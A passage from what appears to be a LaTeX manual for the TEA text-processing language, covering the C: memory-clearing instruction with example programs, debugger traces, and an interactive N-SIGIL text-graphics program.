  \end{tcolorbox}
  \caption{TEA EXAMPLE: Numerically Sorting Words/Values/Numbers in TEA}
  \label{FIGB6}
\end{figure}


And when we run that program depicted in \textbf{\autoref{FIGB6}}, we obtain the following output:


\begin{figure}[H]
  \centering
  \begin{tcolorbox}[myterminalstyle, title=TEA Output from \textbf{\autoref{FIGB6}}]
  \begin{lstlisting}
987653210
7653210
985421
98410
  \end{lstlisting}
  \end{tcolorbox}
  \caption{Result of numerically sorting numeric projections}
\end{figure}

Which then gives us the rankings, and from that we determine the solution to our original problem. Thus we conclude our treatment of \textbf{B:} for now.


%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% TAZ SECTION: C
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\chapter{C: CLEAR}
\label{CHAPC}


\begin{table}[H]
  \centering
  \LARGE
	\begin{tabular}[t]{|p{0.2\textwidth}|p{0.5\textwidth}}
 
	\textbf{NAME} & Clear\\
	\hline
	\textbf{Purpose} & \begin{enumerate}
	\item Clear working memory
	\item Reset all vaults (TEA variables in memory)
	\item Reset particular/named vaults
	\item Reset AI
	\item Guarantee subsequent instructions set memory independently of earlier instructions
	\item Automagically create and initialize named vaults with the EMPTY STRING value.
	\end{enumerate}\\
	\hline
	              
\end{tabular}
\caption{General Objectives of C:}
  \label{TABTAZC}
\end{table}


\section{SEMANTICS of C:}
\label{SECSEMC}

\begin{table}[H]
\centering
\renewcommand{\arraystretch}{1.3} % Optional: increases row height
\rowcolors{1}{lightgray}{white}   % Alternating row colors
\begin{tabular}{>{\bfseries}m{0.3\linewidth} | m{0.6\linewidth}} % 2 columns, 

\rowcolor{white}
\textbf{\makecell[l]{INSTRUCTION\\ SIGNATURE}} & \textbf{INSTRUCTION FUNCTION} \\
\hline

c: & Set Empty String as IO/AI \\

\rowcolor{lightgray}\bfseries c:PARAMS & INERT \\

 c!: & Set Empty String as IO and set to Empty String all 
currently active vaults (including the DEFAULT VAULT)\\
 
\rowcolor{lightgray}\bfseries c!:PARAMS & INERT\\

 c*: & INERT\\
 
 \rowcolor{lightgray}\bfseries \makecell[l]{c*:v1:v2:…:vN \\ c*!:v1:v2:…:vN}& \textbf{ONLY} clear/reset the vaults specified by the given vault names v1, v2,…, vN. Does NOT tamper with IO/AI. \textbf{INCASE} any of the specified vault names points to a vault that does not yet exist, then it shall be created, and automatically initialized with the EMPTY STRING.\\
 
 \hline
\end{tabular}
\caption{The Semantics of C:}
\label{TABSEMC}
\end{table}


\section{NOTES about C:}
\label{SECNOTESC}

For especially purposes of \textbf{C:}, note that the \textbf{Empty String} is the sequence “” --- essentially, a string of 0 length, and that, by setting some vault or variable to that value, we effectively deem it ``reset" or ``cleared". The \textbf{C:} commands DO NOT declare nor [re-]write new or previously undeclared memory spaces --- vaults to be precise, but rather, modify existing, named (and in the case of \texttt{c:}, also the \texttt{DEFAULT/UNNAMED VAULT}\footnote{In TEA parlance, the ``Unnamed" or ``Default Vault" does come up several times as you shall see when exploring the TAZ, and it plays a very crucial role in TEA programming as we shall also come to learn. But essentially, it is a vault whose name is just the EMPTY STRING, ``". Typically, only special instructions can create such a vault, and users of vault-creating primitives such as \texttt{v:vNAME} can not directly create or write to it using an empty name. More about this later.}\footnote{Talking of globally resetting working memory in a TEA program, using say \texttt{c!:}, it shall be useful or rather important to note that, there is JUST ONE variable that no \textbf{C:} command can clear or reset, and that is the \textbf{Initial AI} --- the external, user-provided input at the start of a TEA program is always, and shall always (if it was indeed provided), remain accessible via a special TEA instruction known as \textbf{Yank}; particularly, the instruction \texttt{y*:}, which we shall formally cover in the chapter on \textbf{Y:}.}


With that introduction and the formal specifications of \textbf{C:} out of the way, the program:


 \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: resetting explicitly set AI]
    %\begin{lstlisting}[language=TEA]
  \begin{lstlisting}[language=TEA, caption={TP C1}, label={LSTC1}, numbers=left]
i!:{BC}| c:
# (=, VAULTS:{})
   \end{lstlisting}
  \end{tcolorbox}
  %\caption{Sample TEA Program demonstrating most quirks of TEA programming (MINIFIED version)}
  %\label{FIGC1}
\end{figure}

Despite having an explicit, hard-coded input specified in the first instruction of the program as ``BC", shall, and should return just ``" as expected. While  


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: \texttt{c:} does not clear DEFAULT VAULT]
    %\begin{lstlisting}[language=TEA]
  \begin{lstlisting}[language=TEA, caption={TP C2}, label={LSTC2}, numbers=left]
i!:{BC} | v: | c: | y:
# (=BC, VAULTS:{"":"BC"})
   \end{lstlisting}
  \end{tcolorbox}
  %\caption{Sample TEA Program demonstrating most quirks of TEA programming (MINIFIED version)}
  %\label{FIGC2}
\end{figure}

Should return ``BC". The main difference between those two programs --- which actually initialize their initial input/AI in the same exact way, is that, for the case in \textbf{\autoref{LSTC1}}, \texttt{c:} is invoked before any chance is given to stash the AI somewhere for later use, while, as we see in \textbf{\autoref{LSTC2}}, we first store the input into some memory location --- with \texttt{v:} in this case, which, as we shall see in the section on \textbf{V:}, writes AI to the \textbf{DEFAULT VAULT}, so that, by the time we call \texttt{c:}, which ONLY resets AI, we have that value still accessible later, when we invoke the vault-reading instruction \texttt{y:}\footnote{Concerning this example, note that indeed, as shown in the commented out line, which dumps the state of the TEA runtime at the moment the program exits, we see that indeed, the Default Vault held the stashed value of the original AI so that we can still be able to later read it unless say \texttt{c!:} had been invoked somewhere before termination of the program.}.

However, in the next example:


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: \texttt{c!:} resets all memory]
    %\begin{lstlisting}[language=TEA]
  \begin{lstlisting}[language=TEA, caption={TP C3}, label={LSTC3}, numbers=left]
i!:{BC} | v: | v:XX:{T} | c!: | y:XX
# (=, VAULTS:{"":"","XX":""})
   \end{lstlisting}
  \end{tcolorbox}
  %\caption{Sample TEA Program demonstrating most quirks of TEA programming (MINIFIED version)}
  %\label{FIGC3}
\end{figure}


We note that we shall still end up with the result ``" because whether or not we read the main/implicit memory (AI) or any explicit/named memory (such as the default vault via \texttt{y:} or the ``XX” vault written to in this example program, and which we later read using \texttt{y:XX}), after a call to c!:, all active memory is essentially cleared --- as seen in the dump of the final runtime state in the last comment of \textbf{\autoref{LSTC3}}.


For cases where one wishes to clear only specific sections of memory, via named vaults, the following example can be illustrative enough:

\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: \texttt{c!:} resets all memory]
    %\begin{lstlisting}[language=TEA]
  \begin{lstlisting}[language=TEA, caption={TP C4}, label={LSTC4}, numbers=left]
i!:{BC} | v: | c: | y: | a!: |
v:vA | n:100 | v:vB | v:vGLUE:** 
| c*!:vA | g*!:vGLUE:vA:vB
   \end{lstlisting}
  \end{tcolorbox}
  %\caption{Sample TEA Program demonstrating most quirks of TEA programming (MINIFIED version)}
  %\label{FIGC4}
\end{figure}

That program should return ``**N" where N is some random number (e.g ``BC**98"). Otherwise, without \texttt{c*!:vA}, such as in the following version:

\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: \texttt{c!:} resets all memory]
    %\begin{lstlisting}[language=TEA]
  \begin{lstlisting}[language=TEA, caption={TP C5}, label={LSTC5}, numbers=left]
i!:{BC} | v: | c: | y: | a!: | 
v:vA | n:100 | v:vB | v:vGLUE:** 
| g*!:vGLUE:vA:vB
   \end{lstlisting}
  \end{tcolorbox}
  %\caption{Sample TEA Program demonstrating most quirks of TEA programming (MINIFIED version)}
  %\label{FIGC4}
\end{figure}

 
 should return something like ``CB**N" or ``BC**N" (e.g ``CB**42") because nothing reset or cleared the associated memory space, \texttt{vA}. 
 
 One would get an appreciation of how these commands work, by inspecting the resultant system state at the end of running that earlier program in \textbf{\autoref{LSTC4}} as shown in the following TEA Debugger output and memory dump associated with running that program\footnote{Shown here in two separate screenshots, because of the length of the total output.} Vs running the second/modifed program in \textbf{\autoref{LSTC5}}.
 
 
 \begin{figure}[H]
  \centering
  \begin{tcolorbox}[myterminalstyle, title=Truncated TEA Debugger Output from executing \textbf{\autoref{LSTC4}}]
  \begin{lstlisting}
No explicit INPUT found
INPUT:
 
CODE:
 i!:{BC} | v: | c: | y: | a!: |
v:vA | n:100 | v:vB | v:vGLUE:** 
| c*!:vA | g*!:vGLUE:vA:vB
---------[ IN TEA RUNTIME ]

+++[NO TEA CODE ERRORS FOUND YET]
#13 of ["i!:{BC} "," v: "," c: "," y: "," a!: ","","v:vA "," n:100 "," v:vB "," v:vGLUE:** ",""," c*!:vA "," g*!:vGLUE:vA:vB"]
CLEAN TEA CODE TO PROCESS:
i!:{BC} 
v: 
c: 
.
.
.
--[#11 TEA INSTRUCTIONS FOUND]---
...
Processing Instruction: c: 
PRIOR MEMORY STATE: (=BC, VAULTS:{"":"BC"})
RESULTANT MEMORY STATE: (=, VAULTS:{"":"BC"})
Executing Instruction#3 (out of 11)
Processing Instruction: y: 
PRIOR MEMORY STATE: (=, VAULTS:{"":"BC"})
+++[WARNING] INSTRUCTION WITH NO DATA TO PROCESS FOUND: y: 
--[INFO] Reading VAULT[]
[INFO] Returning string  in DEFAULT VAULT [BC]
RESULTANT MEMORY STATE: (=BC, VAULTS:{"":"BC"})
Executing Instruction#4 (out of 11)
Processing Instruction: a!: 
PRIOR MEMORY STATE: (=BC, VAULTS:{"":"BC"})
RESULTANT MEMORY STATE: (=CB, VAULTS:{"":"BC"})
Executing Instruction#5 (out of 11)
Processing Instruction: v:vA 
PRIOR MEMORY STATE: (=CB, VAULTS:{"":"BC"})
--[INFO] Wrote VAULT[vA = [CB]]
RESULTANT MEMORY STATE: (=CB, VAULTS:{"":"BC","vA":"CB"})
Executing Instruction#6 (out of 11)
Processing Instruction: n:100 
PRIOR MEMORY STATE: (=CB, VAULTS:{"":"BC","vA":"CB"})
RESULTANT MEMORY STATE: (=95, VAULTS:{"":"BC","vA":"CB"})
... 
PRIOR MEMORY STATE: (=95, VAULTS:{"":"BC","vA":"CB","vB":"95"})
--[INFO] Wrote VAULT[vGLUE = [**]]
RESULTANT MEMORY STATE: (=95, VAULTS:{"":"BC","vA":"CB","vB":"95","vGLUE":"**"})
Executing Instruction#9 (out of 11)
Processing Instruction: c*!:vA 
PRIOR MEMORY STATE: (=95, VAULTS:{"":"BC","vA":"CB","vB":"95","vGLUE":"**"})
RESULTANT MEMORY STATE: (=95, VAULTS:{"":"BC","vA":"","vB":"95","vGLUE":"**"})
Executing Instruction#10 (out of 11)
Processing Instruction: g*!:vGLUE:vA:vB
PRIOR MEMORY STATE: (=95, VAULTS:{"":"BC","vA":"","vB":"95","vGLUE":"**"})
--[INFO] Reading VAULT[vGLUE]
--[INFO] Reading VAULT[vA]
--[INFO] Reading VAULT[vB]
RESULTANT MEMORY STATE: (=**95, VAULTS:{"":"BC","vA":"","vB":"95","vGLUE":"**"})
  \end{lstlisting}
  \end{tcolorbox}
  \caption{TEA Debugger Output for Understanding Memory Alteration via \texttt{c*!:vA}}
  \label{FIGC5}
\end{figure}


\begin{figure}[H]
  \centering
  \begin{tcolorbox}[myterminalstyle, title=Truncated TEA Debugger Output from executing \textbf{\autoref{LSTC5}}]
  \begin{lstlisting}
...
---------[ IN TEA RUNTIME ]

+++[NO TEA CODE ERRORS FOUND YET]
#12 of ["i!:{BC} "," v: "," c: "," y: "," a!: "," ","v:vA "," n:100 "," v:vB "," v:vGLUE:** ",""," g*!:vGLUE:vA:vB"]
CLEAN TEA CODE TO PROCESS:
i!:{BC} 
v: 
c: 
y: 
a!: 
v:vA 
n:100 
v:vB 
v:vGLUE:** 
g*!:vGLUE:vA:vB
--[#10 TEA INSTRUCTIONS FOUND]---
...
Processing Instruction: y: 
PRIOR MEMORY STATE: (=, VAULTS:{"":"BC"})
+++[WARNING] INSTRUCTION WITH NO DATA TO PROCESS FOUND: y: 
--[INFO] Reading VAULT[]
[INFO] Returning string  in DEFAULT VAULT [BC]
RESULTANT MEMORY STATE: (=BC, VAULTS:{"":"BC"})
Executing Instruction#4 (out of 10)
Processing Instruction: a!: 
PRIOR MEMORY STATE: (=BC, VAULTS:{"":"BC"})
RESULTANT MEMORY STATE: (=CB, VAULTS:{"":"BC"})
Executing Instruction#5 (out of 10)
Processing Instruction: v:vA 
PRIOR MEMORY STATE: (=CB, VAULTS:{"":"BC"})
--[INFO] Wrote VAULT[vA = [CB]]
RESULTANT MEMORY STATE: (=CB, VAULTS:{"":"BC","vA":"CB"})
Executing Instruction#6 (out of 10)
Processing Instruction: n:100 
PRIOR MEMORY STATE: (=CB, VAULTS:{"":"BC","vA":"CB"})
RESULTANT MEMORY STATE: (=81, VAULTS:{"":"BC","vA":"CB"})
Executing Instruction#7 (out of 10)
Processing Instruction: v:vB 
PRIOR MEMORY STATE: (=81, VAULTS:{"":"BC","vA":"CB"})
--[INFO] Wrote VAULT[vB = [81]]
RESULTANT MEMORY STATE: (=81, VAULTS:{"":"BC","vA":"CB","vB":"81"})
Executing Instruction#8 (out of 10)
Processing Instruction: v:vGLUE:** 
PRIOR MEMORY STATE: (=81, VAULTS:{"":"BC","vA":"CB","vB":"81"})
--[INFO] Wrote VAULT[vGLUE = [**]]
RESULTANT MEMORY STATE: (=81, VAULTS:{"":"BC","vA":"CB","vB":"81","vGLUE":"**"})
Executing Instruction#9 (out of 10)
Processing Instruction: g*!:vGLUE:vA:vB
PRIOR MEMORY STATE: (=81, VAULTS:{"":"BC","vA":"CB","vB":"81","vGLUE":"**"})
--[INFO] Reading VAULT[vGLUE]
--[INFO] Reading VAULT[vA]
--[INFO] Reading VAULT[vB]
RESULTANT MEMORY STATE: (=CB**81, VAULTS:{"":"BC","vA":"CB","vB":"81","vGLUE":"**"})
  \end{lstlisting}
  \end{tcolorbox}
  \caption{TEA Debugger Output for Understanding Memory Alteration via C:}
  \label{FIGC6}
\end{figure}

Before we close the discussion about \texttt{C:}, note that, if the vault-manipulating variants of the \textbf{CLEAR} TEA primitve are invoked with names to vaults that don't yet exist, then they shall automatically create those vaults without complaining, and initialize them to ``". 

An illustration of this effect is demonstrated when we invoke the program:


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: explore selective processing of vaults by c*]
  %\begin{lstlisting}[language=TEA, caption={TP C6}, label={LSTC6}, numbers=left]
    \begin{lstlisting}[language=TEA]
v:vC:TEST|v:vF:TEST-F|c*!:vC:vD
   \end{lstlisting}
  \end{tcolorbox}
  %\caption{Sample TEA Program demonstrating most quirks of TEA programming (MINIFIED version)}
  %\label{FIGC6}
\end{figure}


On the TEA commandline as shown in the following screenshot:

\begin{figure}[H]
  \centering
  \begin{tcolorbox}[myterminalstyle, title=Selective Processing of Vaults by \texttt{C*:} and \texttt{C*!:}]
  \begin{lstlisting}
EXPERIMENTS|< 15:22:41 $>* tttt -c "v:vC:TEST|v:vF:TEST-F|c*!:vC:vD" -d
No explicit INPUT found, using STDIN!
INPUT:
 None
CODE:
 v:vC:TEST|v:vF:TEST-F|c*!:vC:vD
---------[ IN TEA RUNTIME ]

+++[NO TEA CODE ERRORS FOUND YET]
CLEAN TEA CODE TO PROCESS:
v:vC:TEST
v:vF:TEST-F
c*!:vC:vD
--[#3 TEA INSTRUCTIONS FOUND]---

---<< EXTRACTED TEA LABEL BLOCKS:
{}

Executing Instruction#0 (out of 3)
Processing Instruction: v:vC:TEST
PRIOR MEMORY STATE: (=, VAULTS:{})
-- [INFO] Wrote VAULT[vC = [TEST]]
RESULTANT MEMORY STATE: (=, VAULTS:{'vC': 'TEST'})
Executing Instruction#1 (out of 3)
Processing Instruction: v:vF:TEST-F
PRIOR MEMORY STATE: (=, VAULTS:{'vC': 'TEST'})
-- [INFO] Wrote VAULT[vF = [TEST-F]]
RESULTANT MEMORY STATE: (=, VAULTS:{'vC': 'TEST', 'vF': 'TEST-F'})
Executing Instruction#2 (out of 3)
Processing Instruction: c*!:vC:vD
PRIOR MEMORY STATE: (=, VAULTS:{'vC': 'TEST', 'vF': 'TEST-F'})
RESULTANT MEMORY STATE: (=, VAULTS:{'vC': '', 'vF': 'TEST-F', 'vD': ''})
  \end{lstlisting}
  \end{tcolorbox}
  \caption{TEA Debugger Output for Understanding Selective Processing of Vaults by \texttt{C*:} and \texttt{C*!:}}
  \label{FIGC7}
\end{figure}


\section{EXAMPLE APPLICATIONS of C:}
\label{SECEXAMPC}

\texttt{C:} is mostly about clearing or rather, managing memory. Quite an important facility for those who recall the ancient days of programming in languages such as C and C++, that not only made available the nifty and useful, but also painful facility of pointers and manual memory management! Luckily, in TEA, the programmer need not worry much about manual management of memory --- particularly, with regards to correctly creating, initializing and clearing or especially disposing of/returning memory to the system, because much of it is already catered for by the TEA runtime, and no possibility for example, exists, for a TEA program to directly or readily write uninitialized memory, nor for the program to quit without correctly returning memory to the underlying system.

However, that said, and given the only way to use memory with references or pointers is via TEA Vaults, we then shall acknowledge and appreciate, that, with proper use of the basic facility to create, set, update and clear memory\footnote{\textbf{WARNING:} note that, currently (as of \textbf{TEA v1.1.0} --- see \url{https://tea.nuchwezi.com} for latest), TEA provides no direct means to delete entirely or rather, to unregister a previously named memory pointer/variable reference such as with vault names, other than merely clearing the referenced memory space (such as by setting it to the EMPTY SPACE). But if required, perhaps future TEA versions might avail this functionality as a subset of \textbf{C*:} or \textbf{C.:} command space.}, the software programmer can design or implement many useful and efficient computer programs that might leverage logic that relies on the state of the program's memory so as to perform correctly. The following non-trivial, but still basic program, is a great illustration of such a computer program.


\subsection{EXAMPLE 1: The N-SIGIL Generator: print textual-qrcode corresponding to some number N}
\label{SECEXAMP1C}

This program we are going to look at next, is mostly classified as both a graphical and interactive game-like software that can correctly work as written, for particularly WEB TEA\footnote{As we have indicated in \textbf{\autoref{SEC1}}, programs leveraging the \texttt{Z:CMD} instructions might not be readily portable across just WEB and CLI TEA.} --- access to which is currently readily possible via the \textbf{TEA WEB Integrated Development Environment}: \url{https://tea.nuchwezi.com}.

The program was originally developed to be part of the standard demonstration programs for the WEB TEA suite, and at basic, it does the following:

\begin{enumerate}
\item Given some numeric input, $n$, that lies within some pre-configured range: $1 \leq n \leq (nCols \times nRows)$, shall proceed to process that user-provided response, $n$, so that it then prints a matrix of $(nCols \times nRows)$ on the screen, and inside which it plots and prints a specific and deterministic basic diagram mapping the specified argument to some finite number of ``graphical bits" that unlike the rest of the matrix or grid, are \textbf{ON}, while the rest are \textbf{OFF}.
\item Essentially, it prints a ``sigil" or rather a kind of ``QRCode" or primitive ``Barcode" that can uniquely distinguish the provided number argument from any other\footnote{No, currently, it is not guaranteed to always return a universally distinct sigil for any real number, given some  numbers might result in a projection that is shared by other numbers too, but, for a particular set of $(nCols \times nRows)$, any particular $n$ is guaranteed to result in the same projection or picture across invocations of the same program or algorithm.}.
\item After prompting for and displaying the image corresponding to a user provided response, the program first clears the core graphics memmory previously utilized, via leveraging the TEA \texttt{c*:vNAME} instructions, and then re-iterates, prompting the user for the next number to visualize.
\item It is written to be intelligent enough despite its text-only user-interface, so that, once the user feels like quitting or stopping, they can just respond with the \textbf{STOP}-command; ``end", and then the program shall quit.
\end{enumerate}

In a somewhat verbose style --- so that TEA-newcomers might also get the chance to see what non-trivial TEA programming is like, as well as learn some useful quirks of how to jaggle things in TEA, we shall intermix code and comments, as well as mostly use the unminified style of TEA source.


 %\begin{figure}[H]
 \small
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: N-SIGIL image generator program, breakable]
  %\begin{lstlisting}[language=TEA, caption={TP C7}, label={LSTC7}, numbers=left]
  \begin{lstlisting}[language=TEA,breaklines=true]
#~~[WELCOME to N-SIGIL v1.0.0]
#~~[not for the faint of heart]
#--|original algorithm by fut.prof. JWL
#--|WARNING: this TEA program is meant to 
#--|work as currently implemented
#--|ONLY for WEB TEA such as: 
#--| https://tea.nuchwezi.com
#----------------------------------------------------|

#BEGIN: determine what our image dimensions 
# shall be (not user-set)
v:vCOL:10 #columns e.g 5
v:vROW:6 #rows e.g 4
g*:*:vCOL:vROW | v:vN | z*:vN | v:vN #cardinality of grid (=20)

l:lSTART
#first, CLEAR/INIT key vaults:
c*!:vA:vAA:vB:vC:vD:vE:vF

i!:{=======[WELCOME to N-SIGILS]======
N-SIGILS v.1.0.0 is written in TEA v.1.1.0, 
and is an experiment to do basic graphics 
in TEA using text-processing. It is entertaining,
and will help you draw a basic QR-CODE sigil
for any number you specify. It is also interactive;
At any moment, you can quit if you like.
=============================}|i: #instructions

i!:{Preferably, pick a number between 1 and } 
| x*!:vN | x!:{ }|x!: (or `end' to QUIT): | v:vPROMPT
i: #prompt
v:vRESPONSE # stash user response
#store marshalled answer (e.g vANS=8)
z:{Math.abs(Number(AI))||1} | v:vANS 

#otherwise, first confirm if we got a legit number
y:vRESPONSE # retrieve user response
z:{Number(AI)} 
f!:NaN:lPROCESS_BLANK
j:lERRORNaN 

#check we are processing a blank number
l:lPROCESS_BLANK
y:vRESPONSE
f!:^$:lPROCESS
j:lERRORNaN

#continue to process
l:lPROCESS

y:vANS #retrieve number we saved

#compute vA
#adjust as: ((n)=>Math.floor(n/vN) + (n%vN))(vA)
v:vEXP1:((n)=>Math.floor(n/|
v:vEXP2:) + (n%|v:vEXP3:))(|v:vEXP4:)
v:vA | g*:{}:vEXP1:vN:vEXP2:vN:vEXP3:vA:vEXP4 |
v:vCMDA|z*:vCMDA|v:vA #vA=8

#compute vAA
#adjust as: ((n)=>(Math.floor(n/vCOL) + (n%vCOL))%vCOL)(vA)
v:vEXP1:((n)=>(Math.floor(n/|v:vEXP2:) + (n%|
v:vEXP3:))%|v:vEXP4:)(|v:vEXP5:)
| g*:{}:vEXP1:vCOL:vEXP2:vCOL:vEXP3:vCOL:vEXP4:vA:vEXP5 
|v:vCMDAA|z*:vCMDAA|v:vAA #vAA=4
 
#vA -> compute vB: ((n)=>(vN + n)%vCOL)(vA)
v:vEXP1:((n)=>(|v:vEXP2: + n)%|v:vEXP3:)(|v:vEXP4:)
g*:{}:vEXP1:vN:vEXP2:vCOL:vEXP3:vA:vEXP4 |v:vCMDB|
z*:vCMDB|v:vB #vB=3

#vB -> compute vC: ((n)=>Math.abs(vN - n)%vCOL)(vB)
v:vEXP1:((n)=>Math.abs(|v:vEXP2: - n)%|v:vEXP3:)(|v:vEXP4:)
g*:{}:vEXP1:vN:vEXP2:vCOL:vEXP3:vB:vEXP4 |v:vCMDC|
z*:vCMDC|v:vC #vC=2

#vC -> compute vD: 
#((n)=>Math.floor((n*vN*0.5)/vROW) + Math.floor((n*vN*0.5)%vROW))(vC)
v:vEXP1:((n)=>Math.floor((n*|v:vEXP2:*0.5)/|
v:vEXP3:) + Math.floor((n*|v:vEXP4:*0.5)%|v:vEXP5:))(|v:vEXP6:)
g*:{}:vEXP1:vN:vEXP2:vROW:vEXP3:vN:vEXP4:vROW:vEXP5:vC:vEXP6 |
v:vCMDD|z*:vCMDD|v:vD #vD=5

#vD -> compute vE: 
#((n)=>Math.floor(Math.abs(n - vN*0.5)/vROW) 
#+ Math.floor(Math.abs(n - vN*0.5)%vROW))(vD)
v:vEXP1:((n)=>Math.floor(Math.abs(n - |v:vEXP2:*0.5)/|
v:vEXP3:) + Math.floor(Math.abs(n - |v:vEXP4:*0.5)%|v:vEXP5:))(|v:vEXP6:)
g*:{}:vEXP1:vN:vEXP2:vROW:vEXP3:vN:vEXP4:vROW:vEXP5:vD:vEXP6 
|v:vCMDE|z*:vCMDE|v:vE #vE=2

#vD -> compute vF: 
#((n)=>Math.floor(Math.abs(n*0.5)/vCOL) + Math.floor(Math.abs(n*0.5)%vCOL))(vN)
v:vEXP1:((n)=>Math.floor(Math.abs(n*0.5)/|
v:vEXP2:) + Math.floor(Math.abs(n*0.5)%|v:vEXP3:))(|v:vEXP4:)
g*:{}:vEXP1:vCOL:vEXP2:vCOL:vEXP3:vN:vEXP4 |
v:vCMDF|z*:vCMDF|v:vF #vF=5

#DEBUG: show which coordinates to shade
#1: vA -> (1,vAA) -> (1,4)
#2: vB -> (2,vB) -> (2,3)
#3: vC -> (3,vC) -> (3,2)
#5: vD -> (4,vD) -> (4,5)
#6: vE -> (vF, vE) -> (5,2)

#Given vCOL x vROW -> (5x4) and <(x,y)*> simulate...
###X#
##X##
#X###
#X###

#----[presenting results]-------
l:RESULT

#first, construct the specification for the grid to print
#vCOORDINATES=[(1,vAA), (2,vB), (3,vC), (4,vD),(vF, vE)]
#v:vEXP1:[(1,|v:vEXP2:), (2,|v:vEXP3:), (3,|v:vEXP4:), (4,|v:vEXP5:),(|v:vEXP6:, |v:vEXP7:)]
#G*:{}:vEXP1:vAA:vEXP2:vB:vEXP3:vC:vEXP4:vD:vEXP5:vF:vEXP6:vE:vEXP7 | 

#v1.0.1: this improvement uses the same coordinates in (x,y) and (y,x) for a richer plot
v:vEXP1:[(1,|v:vEXP2:), (2,|v:vEXP3:), (3,|v:vEXP4:), (4,|v:vEXP5:),(|v:vEXP6:,|v:vEXP7:),|G*:{}:vEXP1:vAA:vEXP2:vB:vEXP3:vC:vEXP4:vD:vEXP5:vF:vEXP6:vE:vEXP7|v:vSLICE1|v:vEXP1:(|v:vEXP2:,1), (|v:vEXP3:,2), (|v:vEXP4:,3), (|v:vEXP5:,4),(|v:vEXP6:,|v:vEXP7:)]|G*:{}:vEXP1:vAA:vEXP2:vB:vEXP3:vC:vEXP4:vD:vEXP5:vE:vEXP6:vF:vEXP7|v:vSLICE2|G*:{}:vSLICE1:vSLICE2

v:vCMDCOORDINATES
#orig: [(1,4), (2,3), (3,2), (4,5),(5,2)]
#v1.0.1: [(1,8), (2,8), (3,2), (4,10),(3,5),(8,1), (8,2), (2,3), (10,4),(5,3)]
G*:{,}:vCOL:vROW:vCMDCOORDINATES | v:vCMD_GRIDSPEC

#now print...
y:vCMD_GRIDSPEC #2,4,[(1,4), (2,3), (3,2), (4,5),(5,2)]

v:vCMD_PRINT:{((AI)=>{let[c,r,s]=AI.match(/^(\d+),(\d+),\[(.*)\]$/).slice(1),C=s.match(/\((\d+),(\d+)\)/g).map(p=>p.match(/\((\d+),(\d+)\)/).slice(1).map(Number)),g=Array.from({length:+r},()=>Array(+c).fill("#"));C.forEach(([x,y])=>{if(y>=1&&y<=r&&x>=1&&x<=c)g[y-1][x-1]="X"});return g.map(e=>e.join("")).join("\n")})(AI);}
z*:vCMD_PRINT | v:vRESULT

i!:{__That is your N-SIGIL for }|x*!:vRESPONSE|v:vMSG|g*:{}:vRESULT:vMSG|h!:_|d:_
i: #present

#q!: don't auto-quit..
j:lSTART #loop

l:lERRORNaN #incase response was wrong
y:vRESPONSE | f:end:lSTOP
i!:{Value picked was wrong. Try Again}|i: |j:lSTART #report error, loop

l:lSTOP #closing remarks
i!:{===[Thanks for enjoying the N-SIGIL game and utility]===
 See u n:ext time!} | i: | i!:---[N-SIGIL v1.0.0 QUIT SUCCESSFULLY]--- | -#cheerio
   \end{lstlisting}
  \end{tcolorbox}
  \captionof{figure}{TEA EXAMPLE: \textbf{N-SIGIL} Text-based Unique-Image Generator TEA Game}
  \label{FIGC7}
  %\caption{TEA EXAMPLE: \textbf{N-SIGIL} Text-based Unique-Image Generator TEA Game}
  \vspace{1cm}
  
 \large
 %\centering  
 \raggedright %force normal/left-alignment  
  
  As it is, the TEA program in \textbf{\autoref{FIGC7}} consists of a total of \textbf{136} TEA instructions, spans features such as:
  
\begin{enumerate}
\item Dynamic greeting prompts.
\item Conditional branching logic.
\item Unconventional loops via TEA labels and label-blocks with \texttt{L:}, \texttt{F:} and \texttt{J:} instructions.
\item Conditional program quitting.
\item Text-based graphics.
\item Dynamic [sub-/inner-]program construction via neat string expression composition using \texttt{G:} and \texttt{X:}.
\item non-TEA numeric processing via \texttt{Z:} and JavaScript.
\item Pure offline-processing and functionality.
\item And more!
\end{enumerate} 
 

We can appreciate what the program can do, by looking at sample screenshots of this code in use, via a mobile computer program as shown in the following figures:

\begin{figure}[H]
  \centering
  \begin{subfigure}[b]{0.45\textwidth}
    \includegraphics[width=\textwidth]{resources/images/nsigil_intro.png}
    \caption{N-SIGIL v1.0.1: Intro Greeting Interface}
    \label{FIGNSIGIL}
  \end{subfigure}
  \hfill
  \begin{subfigure}[b]{0.45\textwidth}
    \includegraphics[width=\textwidth]{resources/images/nsigil_ossi.png}
    \caption{N-SIGIL v1.0.1: a basic qrcode for the base-10 o-SSI}
    \label{FIGNSIGIL2}
  \end{subfigure}
  \caption{Phone Snapshots of WEB TEA in action}
  \label{FIGNSIGILDEMO}
\end{figure}


    \begin{figure}[H]
      \centering
      \includegraphics[height=0.6\textheight,]{resources/images/nsigil_qrcode.png}\\
        \caption{N-SIGIL v1.0.1: a basic qrcode for just the number 1}
      \label{FIGNSIGIL3}
    \end{figure}
    
    
  Finally, and before we move on to the next chapter, it might help some readers of the TEA code in the example application we have just covered, by understanding clearer, what the underlying mathematics or algorithm is that make this \textbf{N-Sigil} utility work as it does, especially without using any sophisticated graphics and no imported batteries other than the use of JavaScript to compute some of the program's aspects we couldn't resolve readily in plain TEA. Also, this might help those might wish to port the program to CLI TEA, so that they perhaps know well, how to handle the important aspects of the algorithm. We specify the minimal \textbf{N-Sigil Algorithm} hereafter...
  
  
  \begin{alg}[The \textbf{N-SIGIL Algorithm}: $\text{gen\_sigil}(DATA, nCol, nRow)$]
\label{ALGNSIGIL}
$ $\\
\begin{enumerate}
\item \textbf{GIVEN} the dimensions of the target image as width, $nCol$, and height, $nRow$.

\item{ \textbf{COMPUTE} the total number of cells, ``pixels" or ``bits" that our image shall contain, as such:

\begin{equation}
vN = nCol \times nRow
\end{equation}

}
